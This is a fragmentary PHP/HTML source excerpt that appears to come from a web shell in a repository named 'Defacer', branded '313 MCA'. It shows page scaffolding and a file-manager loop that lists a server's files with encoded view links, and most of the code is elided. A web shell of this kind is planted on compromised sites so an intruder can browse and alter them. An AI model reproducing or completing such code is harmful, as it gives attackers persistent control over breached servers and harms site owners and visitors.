...
<html>
  <head>
    ...
    <link rel="icon" href="https://github.com/NaInSec/Defacer/blob/main/img/313.jpg?raw=true">
    ...
    <div class="container">
        <nav class="navbar navbar-expand-lg navbar-light bg-light">
            <a class="navbar-brand" href="#">
                <img src="https://github.com/NaInSec/Defacer/blob/main/img/313.jpg?raw=true" width="30" height="30" class="d-inline-block align-top auto" alt="Ainz Moe"> {313 MCA}</a>
<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
    ...
    //// FILEMANAGER :D
      ...
      foreach($dr as $fl){
        ...
        echo "
        <tr>
        <td scope=\"row\"><img src=\"https://github.com/NaInSec/Defacer/blob/main/img/313.jpg?raw=true\" width=\"30\" height=\"30\"><a class=\"tod\" href=\"?act=v&p=".enc($dir)."&file=".enc($dir."/".$fl)."\">$fl</a></td>
